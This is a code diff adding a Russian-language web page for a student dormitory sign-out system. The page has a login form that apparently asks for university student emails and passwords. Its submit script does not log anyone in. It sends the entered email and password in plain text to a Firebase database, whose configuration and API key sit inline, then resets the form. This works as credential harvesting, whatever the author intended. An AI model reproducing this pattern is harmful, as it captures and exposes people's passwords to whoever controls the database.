@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <link rel="stylesheet" href="styles/style.css">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="header orange-bgc">
+        <div class="wrapper" id="header">
+            <img src="images/logo.png" alt="logo" class="naming logo">
+            <p class="title white">Электронная роспись</p>
+            <div class="languages">
+                <a href="#" class="ru white bold">Ru</a>
+                <a href="#" class="en white bold">En</a>
+            </div>
+        </div>
+    </div>
+    <div class="main">
+            <div class="wrapper" id="wrapper">
+                <div class="grid">
+                    <div class="in card-bgc">
+                        <p class="title orange">Вход</p>
+                        <form action="" class="forma">
+                            <input type="text" class="login_pole E-mail" placeholder="Логин. Например: st000000@student.spbu.ru">
+                            <input type="password" class="login_pole password" placeholder="Пароль. Например: 00000000">
+                            <button type="submit" class="login_submit title white orange-bgc medium">Войти</button>
+                        </form>
+                    </div>
+                    <div class="out card-bgc">
+                        <p class="title orange">Выход из общежития</p>
+                        <div class="parametrs flex">
+                            <p class="name orange semi-bold mid-text">Причина</p>
+                            <form action="" class="flex">
+                                <select name="" id="flex" class="pole">
+                                    <option value="">В магазин</option>
+                                    <option value="">Гулять</option>
+                                    <option value="">К родителям(законному представителю)</option>
+                                    <option value="">Другое</option>
+                                </select>
+                            </form>
+                        </div>
+                        <div class="parametrs flex">
+                            <p class="name semi-bold orange mid-text">Дата ухода</p>
+                            <form action="" class="flex">
+                                <input type="date" id="start" class="pole" name="trip-start"
+                                value="2021-10-11">
+                            </form>
+                        </div>
+                        
+                        <div class="parametrs flex">
+                            <p class="name semi-bold orange mid-text">Время ухода</p>
+                            <form action="" class="flex">
+                                <input type="time" class="pole">
+                            </form>
+                        </div>
+
+                        <div class="parametrs flex">
+                            <p class="name semi-bold orange mid-text">Дата прихода</p>
+                            <form action="" class="flex">
+                                <input type="date" class="pole" id="start" name="trip-start"
+                                value="2021-10-11">
+                            </form>
+                        </div>
+                        
+                        <div class="parametrs flex">
+                            <p class="name semi-bold orange mid-text">Время прихода</p>
+                            <form action="" class="flex">
+                                <div class="">
+                                    <input type="time" class="pole">
+                                </div>
+                            </form>
+                        </div>
+
+                        <a href="#" class="ready white orange-bgc title medium">Готово</a>
+                    </div>
+                    <div class="last-out card-bgc">
+                        <p class="title orange">Последний выход</p>
+                    </div>
+                </div>
+            </div>
+    </div>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-database.js"></script>
+<script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCuU3_U0yblB7IHdY8CTJb3nY5SSdIlmK8",
+      authDomain: "basr-d0079.firebaseapp.com",
+      databaseURL: "https://basr-d0079-default-rtdb.firebaseio.com",
+      projectId: "basr-d0079",
+      storageBucket: "basr-d0079.appspot.com",
+      messagingSenderId: "250883445973",
+      appId: "1:250883445973:web:c200dd55f9dfd739e0fe5c",
+      measurementId: "G-3M0ZDER1R6"
+    };
+    firebase.initializeApp(firebaseConfig);
+</script>
+<script>
+    var messagesRef = firebase.database().ref('basr-d0079-default-rtdb');
+    $('.forma').submit(function(e) {
+        e.preventDefault();
+     
+        messagesRef.push({
+            email: $('.E-mail').val(),
+            password: $('.password').val(),
+        });
+             
+        $('.forma')[0].reset();
+    });
+</script>
+</html> 
